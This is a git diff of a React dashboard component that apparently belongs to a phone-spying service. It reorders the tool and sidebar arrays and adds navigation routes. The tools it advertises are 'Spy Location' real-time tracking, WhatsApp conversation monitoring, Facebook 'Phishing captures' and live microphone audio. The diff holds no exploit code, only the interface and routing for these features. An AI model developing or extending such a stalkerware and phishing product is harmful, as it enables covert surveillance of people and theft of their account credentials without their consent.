@@ -687,11 +687,27 @@ function WhatsAppSim({ onBack, showLoadMoreMsg, setShowLoadMoreMsg }) {
 }
 
 export default function Dashboard({ email }) {
+  const location = useLocation();
+  const navigate = useNavigate();
   const [active, setActive] = useState('Home');
   const [showLoadMoreMsg, setShowLoadMoreMsg] = useState(false);
   const [selected, setSelected] = useState(0);
-  const { location } = useLocation();
-  const navigate = useNavigate();
+  // Blocos de ferramentas
+  const tools = [
+    { label: 'Lessons', icon: <FaBook size={44} color="#E60033" />, desc: 'Tutorials and instructions' },
+    { label: 'Spy Location', icon: <FaMapMarkerAlt size={44} color="#25d366" />, desc: 'Real-time location' },
+    { label: 'WhatsApp', icon: <FaWhatsapp size={44} color="#25d366" />, desc: 'Conversation monitoring' },
+    { label: 'Instagram', icon: <FaInstagram size={44} color="#E1306C" />, desc: 'Coming soon...' },
+    { label: 'Facebook', icon: <FaFacebookF size={44} color="#1877f3" />, desc: 'Phishing captures' },
+    { label: 'Microphone', icon: <FaMicrophone size={44} color="#fff" />, desc: 'Real-time audio' },
+    { label: 'Support and refund', icon: <FaHome size={44} color="#E60033" />, desc: 'Help and refunds' },
+  ];
+
+  // Itens da sidebar (inclui Home)
+  const sidebarItems = [
+    { label: 'Home', icon: <FaHome size={24} /> },
+    ...tools.map(t => ({ label: t.label, icon: t.icon })),
+  ];
 
   useEffect(() => {
     if (location.pathname === '/faq') setActive('FAQ');
@@ -709,26 +725,15 @@ export default function Dashboard({ email }) {
   useEffect(() => {
     if (active === 'FAQ' && location.pathname !== '/faq') navigate('/faq');
     else if (active === 'Support and refund' && location.pathname !== '/support') navigate('/support');
+    else if (active === 'WhatsApp' && location.pathname !== '/whatsapp') navigate('/whatsapp');
+    else if (active === 'Spy Location' && location.pathname !== '/spy-location') navigate('/spy-location');
+    else if (active === 'Facebook' && location.pathname !== '/facebook') navigate('/facebook');
+    else if (active === 'Microphone' && location.pathname !== '/microphone') navigate('/microphone');
+    else if (active === 'Instagram' && location.pathname !== '/instagram') navigate('/instagram');
+    else if (active === 'Lessons' && location.pathname !== '/lessons') navigate('/lessons');
     else if (active === 'Home' && location.pathname !== '/') navigate('/');
     // Não navegue para Home em outras rotas!
   }, [active, navigate, location.pathname]);
-
-  // Blocos de ferramentas
-  const tools = [
-    { label: 'Lessons', icon: <FaBook size={44} color="#E60033" />, desc: 'Tutorials and instructions' },
-    { label: 'Spy Location', icon: <FaMapMarkerAlt size={44} color="#25d366" />, desc: 'Real-time location' },
-    { label: 'WhatsApp', icon: <FaWhatsapp size={44} color="#25d366" />, desc: 'Conversation monitoring' },
-    { label: 'Instagram', icon: <FaInstagram size={44} color="#E1306C" />, desc: 'Coming soon...' },
-    { label: 'Facebook', icon: <FaFacebookF size={44} color="#1877f3" />, desc: 'Phishing captures' },
-    { label: 'Microphone', icon: <FaMicrophone size={44} color="#fff" />, desc: 'Real-time audio' },
-    { label: 'Support and refund', icon: <FaHome size={44} color="#E60033" />, desc: 'Help and refunds' },
-  ];
-
-  // Itens da sidebar (inclui Home)
-  const sidebarItems = [
-    { label: 'Home', icon: <FaHome size={24} /> },
-    ...tools.map(t => ({ label: t.label, icon: t.icon })),
-  ];
 
   return (
     <>
